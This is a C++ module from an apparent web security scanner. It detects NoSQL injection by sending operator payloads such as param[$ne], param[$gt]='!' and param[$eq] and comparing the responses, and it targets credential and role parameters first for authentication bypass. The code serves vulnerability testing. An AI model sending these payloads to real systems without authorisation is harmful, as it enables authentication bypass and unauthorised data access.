#include "nosql_injection.hpp"
#include "networking.hpp"

#include <QRandomGenerator>
#include <QUrl>
#include <QUrlQuery>

namespace Nullock::Core::NoSqlInjection {

namespace {

constexpr int kMaxSends  = 90;
constexpr int kMaxParams = 12;

// Other params, preserved (excluding the one we're rewriting).
QStringList otherParams(const QString &existing, const QString &param) {
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    return parts;
}

// `param=value` (a plain literal).
QString queryLiteral(const QString &existing, const QString &param, const QString &value) {
    QStringList parts = otherParams(existing, param);
    parts << QString::fromUtf8(QUrl::toPercentEncoding(param)) + "="
           + QString::fromUtf8(QUrl::toPercentEncoding(value));
    return parts.join('&');
}

// `param[$op]=value` -- a nested operator a qs-style parser turns into an object.
QString queryOp(const QString &existing, const QString &param,
                const QString &op, const QString &value) {
    QStringList parts = otherParams(existing, param);
    const QString key = param + "[$" + op + "]";
    parts << QString::fromUtf8(QUrl::toPercentEncoding(key)) + "="
           + QString::fromUtf8(QUrl::toPercentEncoding(value));
    return parts.join('&');
}

QString randVal() {
    static const char hex[] = "0123456789abcdef";
    QString s = QStringLiteral("nlk");
    for (int i = 0; i < 8; ++i) s += hex[QRandomGenerator::global()->bounded(16)];
    return s;
}

} // namespace

QStringList defaultParams() {
    // Ordered by NoSQLi/auth-bypass yield so the cap keeps the highest-value
    // names (the credential/privilege params first); the rest go to droppedParams.
    return { "password", "account", "role", "login", "user", "username", "email",
             "id", "name", "search", "query", "q", "filter" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems(QUrl::FullyEncoded)) {
            const QString name = QUrl::fromPercentEncoding(kv.first.toUtf8());
            if (!params.contains(name)) params << name;   // decoded, matching otherParams()
        }
        if (params.isEmpty()) params = defaultParams();
    }
    if (params.size() > kMaxParams) {
        result.droppedParams = params.mid(kMaxParams);   // surfaced so a clean
        params = params.mid(0, kMaxParams);              // result isn't silently partial
    }
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    for (const QString &param : params) {
        if (result.requestsSent + 5 > kMaxSends) break;   // 2 literal + ne + gt + eq
        const QString rv = randVal();
        // TWO literal probes first: they must agree, or the page is dynamic and
        // the differential can't be trusted -- skip rather than false-positive.
        const auto lit1 = send(queryLiteral(req.query, param, rv));
        const auto lit2 = send(queryLiteral(req.query, param, rv));
        if (!lit1.ok || !lit2.ok) continue;
        const int litLen = lit1.parsed.body.size();
        const int litStatus = lit1.parsed.statusCode;
        if (litStatus != lit2.parsed.statusCode || !lenSimilar(litLen, lit2.parsed.body.size()))
            continue;   // unstable baseline

        // TWO always-true operators ($ne, $gt) + one always-false ($eq). $gt
        // uses "!" -- a low-sorting NON-EMPTY value (an empty value is dropped by
        // many query parsers), so {field:{$gt:"!"}} over-matches string fields.
        const auto ne = send(queryOp(req.query, param, "ne", rv));
        const auto gt = send(queryOp(req.query, param, "gt", QStringLiteral("!")));
        const auto eq = send(queryOp(req.query, param, "eq", rv));
        if (!ne.ok || !gt.ok || !eq.ok) continue;

        if (confirmsInjection(litLen, litStatus,
                              eq.parsed.body.size(), eq.parsed.statusCode,
                              ne.parsed.body.size(), ne.parsed.statusCode,
                              gt.parsed.body.size(), gt.parsed.statusCode)) {
            result.hits.append({ param,
                QStringLiteral("always-true $ne(len=%1/%2) & $gt(len=%3/%4) agree and diverge "
                               "from literal(len=%5/%6); $eq(len=%7/%8) tracked the literal")
                    .arg(ne.parsed.body.size()).arg(ne.parsed.statusCode)
                    .arg(gt.parsed.body.size()).arg(gt.parsed.statusCode)
                    .arg(litLen).arg(litStatus)
                    .arg(eq.parsed.body.size()).arg(eq.parsed.statusCode) });
            result.vulnerable = true;
        }
    }

    return result;
}

} // namespace Nullock::Core::NoSqlInjection
